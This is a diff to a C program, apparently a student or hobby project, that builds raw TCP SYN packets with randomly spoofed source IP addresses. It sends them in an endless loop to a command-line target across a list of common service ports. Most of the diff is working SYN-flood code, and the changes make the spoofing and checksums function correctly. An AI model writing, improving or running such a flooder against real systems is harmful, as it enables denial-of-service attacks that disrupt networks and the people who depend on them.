@@ -7,15 +7,8 @@
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
-
-//generate random ip address between 11.0.0.0-126.255.255.254
-//10.0.0.0 is reserved for private networks
-//127.0.0.0 and onwards ranges are reserved for loopback, link-local addresses etc
-//for last octet 254 max value since 255 is for broadcast
+ 
 char* randomIP(){
-	//assign different value to srand each time to be able to generate different random number each time
-	//srand(time(NULL));
-	
 	//generate random numbers per octets
 	int random1=11+rand()%116;
 	int random2=rand()%256;
@@ -56,7 +49,7 @@ unsigned short checksum(unsigned short *ptr,int nbytes){
     	return result;
 }
 
-void printPacket(const unsigned char* packet, size_t length) {
+void printPacket(const unsigned char* packet, size_t length){
     // Cast the packet buffer to the IP header structure
     const struct iphdr* ip_header = (const struct iphdr*)packet;
 
@@ -102,47 +95,20 @@ void printPacket(const unsigned char* packet, size_t length) {
     printf(" - Data Offset: %d\n", tcp_header->doff);
     printf(" - Checksum: %hu\n", tcp_header->check);
 }
-
+ 
 //structure used to calculate checksum
 struct pseudo_header{
 	unsigned int src_addr;
 	unsigned int dst_addr;
-	unsigned char protocol;
 	unsigned char placeholder;
+	unsigned char protocol;
 	unsigned short tcp_length;
 	struct tcphdr tcp_hdr;
 };
-
+ 
 int main(int argc, char *argv[]){
-	//initialize with 0, 2048 bytes of buffer (reasonable amount of memory) to store packet
-	char buffer[2048];
-	memset(buffer, 0, 2048);
-	
-	//address of destination to be attacked from argument
-	in_addr_t dst_address=inet_addr(argv[1]); 
-	
-	//source port converted to network byte order big endian (standard for network communication)
-	unsigned short src_port=htons(8080);
-	
-	//destination ports (commonly used for tcp communication)
-	//80: HTTP, 443: HTTPS, 3128, 8080: HTTP proxy, 8888, 4433, 8443, 8447, 8444: Common alternatives
-	//21: FTP, 22: SSH, 23: Telnet, 25: SMTP, 53: DNS, 1723: Tunneling, 1194: OpenVPN
-	//3306: MySQL, 1433: SQL Server, 5432: Postgre, 1521: Oracle, 27017: Mongo
-	//3389: Remote Desktop, 161: Network management, 123: Network time, 389: Directory, 5060, 5061: VoIP
-	unsigned short dst_ports[]={80, 443, 3128, 8080, 8888, 4433, 8443, 8447, 8444, 21, 22, 23, 25, 53, 1723, 1194, 3306, 1433, 5432, 1521, 27017, 3389, 161, 123, 389, 5060, 5061};
-	
-	//pointer for ip header pointing to buffer
-    	struct iphdr *ip_header = (struct iphdr *) buffer;
-    	
-    	//pointer for tcp header pointing to address after ip header
-    	struct tcphdr *tcp_header = (struct tcphdr *) (buffer + sizeof (struct ip));
-    	
-    	//defining socket address structure except port
-    	struct sockaddr_in sin;
-    	sin.sin_family = AF_INET;
-    	sin.sin_addr.s_addr=dst_address;
 
-	//create raw socket of IPv4, TCP Protocol
+    	//create raw socket of IPv4, TCP Protocol
 	//integer returned is socket file desriptor
 	int raw_socket=socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 	if (raw_socket < 0) {
@@ -156,66 +122,93 @@ int main(int argc, char *argv[]){
         	perror("Failed to set IP_HDRINCL option to 1");
         	return -1;
     	}
-	
-	//defining ip header except saddr and id fields
-    	ip_header->daddr=dst_address;
-	ip_header->version=4;
-    	ip_header->protocol=IPPROTO_TCP;
-	ip_header->ihl=5;	//internet header length typically 5 words(20 bytes)
-	ip_header->tos=0;	//type of service(quality of sevice) set to 0
-	ip_header->tot_len=sizeof(struct ip) + sizeof(struct tcphdr);	//total length of ip packet
-	ip_header->frag_off=0;	//defining no fragmentation
-    	ip_header->ttl=255;	//time to live set to max
-    	ip_header->check=0;	//checksum set to 0 first so non-zero value does not interfere in calculation
     	
-    	//defining tcp header except dest field
-    	tcp_header->source=src_port;
-    	tcp_header->seq=0;	//initial sequence number
-    	tcp_header->ack_seq=0;	//no acknowledgment expected
-    	tcp_header->window=htons(5840);
-    	tcp_header->doff=5;	//tcp header length typically set to 5 words(20 bytes)
-    	tcp_header->urg_ptr=0;	//no urgent data
-    	tcp_header->fin=0;
-    	tcp_header->syn=1;	//request type set to syn
-    	tcp_header->rst=0;
-    	tcp_header->psh=0;
-    	tcp_header->ack=0;
-    	tcp_header->urg=0;
-    	tcp_header->check = 0;	//non-zero value can interfere with calculation
     	
-    	//defining structure for checksum calculation
+    	//4096 bytes buffer (reasonable amount of memory) to store packet
+    	char buffer[4096] , source_ip[32];
+    	
+    	//pointer for ip header pointing to buffer
+    	struct iphdr *ip_header = (struct iphdr *) buffer;
+    	
+    	//pointer for tcp header pointing to address after ip header
+    	struct tcphdr *tcp_header = (struct tcphdr *) (buffer + sizeof (struct ip));
+    	
+    	//socket address structure
+    	struct sockaddr_in sin;
+    	
+    	//header to calculate checksum
     	struct pseudo_header ps_header;
-    	ps_header.src_addr=ip_header->saddr;
-    	ps_header.dst_addr=ip_header->daddr;
-    	ps_header.protocol=ip_header->protocol;
-    	ps_header.placeholder=0;
-    	ps_header.tcp_length=htons(sizeof(struct tcphdr));
-    	memcpy(&ps_header.tcp_hdr, tcp_header, sizeof(struct tcphdr));
     	
+    	//source port converted to network byte order big endian (standard for network communication)
+	unsigned short src_port=htons(1234);
+    
+    	//destination ports (commonly used for tcp communication)
+	//80: HTTP, 443: HTTPS, 3128, 8080: HTTP proxy, 8888, 4433, 8443, 8447, 8444: Common alternatives
+	//21: FTP, 22: SSH, 23: Telnet, 25: SMTP, 53: DNS, 1723: Tunneling, 1194: OpenVPN
+	//3306: MySQL, 1433: SQL Server, 5432: Postgre, 1521: Oracle, 27017: Mongo
+	//3389: Remote Desktop, 161: Network management, 123: Network time, 389: Directory, 5060, 5061: VoIP
+	unsigned short dst_ports[]={80, 443, 3128, 8080, 8888, 4433, 8443, 8447, 8444, 21, 22, 23, 25, 53, 1723, 1194, 3306, 1433, 5432, 1521, 27017, 3389, 161, 123, 389, 5060, 5061};
+     
+     
     	srand(time(NULL));
     	int total_ports=sizeof(dst_ports)/sizeof(dst_ports[0]);
     	int ports_count=0;
     	int packets_count=0;
     	while(1){
-    		//random ip generated and converted into its binary format to be stored in header
-    		//random 5 digit id given to ip header
-		char* random_ip=randomIP();
-		in_addr_t src_address = inet_addr("192.168.1.2");
-    		ip_header->saddr=src_address;
-    		ip_header->id=htons(10000+rand()%90000);
-    		
-    		//destination ports set in tcp header and sin structure one after another
-    		tcp_header->dest=htons(dst_ports[ports_count]);
+    		strcpy(source_ip , randomIP());
+   
+    		sin.sin_family = AF_INET;
     		sin.sin_port=htons(dst_ports[ports_count]);
-    		
-    		//calculating and setting checksums
+    		sin.sin_addr.s_addr = inet_addr(argv[1]);
+     
+	    	memset (buffer, 0, 4096); /* zero out the buffer */
+     
+    		//defining ip header except saddr and id fields
+    		ip_header->saddr=inet_addr(source_ip);
+    		ip_header->daddr=sin.sin_addr.s_addr;
+		ip_header->version=4;
+    		ip_header->protocol=IPPROTO_TCP;
+		ip_header->ihl=5;	//internet header length typically 5 words(20 bytes)
+		ip_header->tos=0;	//type of service(quality of sevice) set to 0
+		ip_header->tot_len=sizeof(struct ip) + sizeof(struct tcphdr);	//total length of ip packet
+		ip_header->frag_off=0;	//defining no fragmentation
+    		ip_header->ttl=255;	//time to live set to max
+    		ip_header->check=0;	//checksum set to 0 first so non-zero value does not interfere in calculation
+     
     		ip_header->check=checksum((unsigned short *)ip_header, sizeof(struct iphdr));
-    		tcp_header->check=checksum((unsigned short*)&ps_header, sizeof(struct pseudo_header));
-    	
+     
+    		//defining tcp header except dest field
+    		tcp_header->source=src_port;
+    		tcp_header->dest=htons(dst_ports[ports_count]);
+    		tcp_header->seq=0;	//initial sequence number
+    		tcp_header->ack_seq=0;	//no acknowledgment expected
+    		tcp_header->window=htons(5840);
+    		tcp_header->doff=5;	//tcp header length typically set to 5 words(20 bytes)
+    		tcp_header->urg_ptr=0;	//no urgent data
+    		tcp_header->fin=0;
+    		tcp_header->syn=1;	//request type set to syn
+    		tcp_header->rst=0;
+    		tcp_header->psh=0;
+    		tcp_header->ack=0;
+    		tcp_header->urg=0;
+    		tcp_header->check = 0;	//non-zero value can interfere with calculation
+     
+    		//defining structure for checksum calculation except src_addr
+    		struct pseudo_header ps_header;
+    		ps_header.src_addr=ip_header->saddr;
+    		ps_header.dst_addr=sin.sin_addr.s_addr;
+    		ps_header.protocol=ip_header->protocol;
+    		ps_header.placeholder=0;
+    		ps_header.tcp_length=htons(sizeof(struct tcphdr));
+     
+    		memcpy(&ps_header.tcp_hdr , tcp_header , sizeof (struct tcphdr));
+     
+    		tcp_header->check = checksum((unsigned short*) &ps_header, sizeof (struct pseudo_header));
+    		
     		//send packet and store value returned that is number of bytes succesfully sent
     		int result=sendto(raw_socket, buffer, ip_header->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
-    		
-    		if(result<0){
+    	   
+        	if(result<0){
 			printf("Error occurred while sending packet.\n");
 		}
 		else{
@@ -226,11 +219,10 @@ int main(int argc, char *argv[]){
     			}
     			
 			printf("Packet %d Sent.\n", packets_count);
-			printPacket(buffer, ip_header->tot_len);
+			//printPacket(buffer, ip_header->tot_len);
+			printf("----------------------------------------\n");
 		}
-		
-		free(random_ip);
     	}
-	
-	return 0;
+     
+    	return 0;
 }
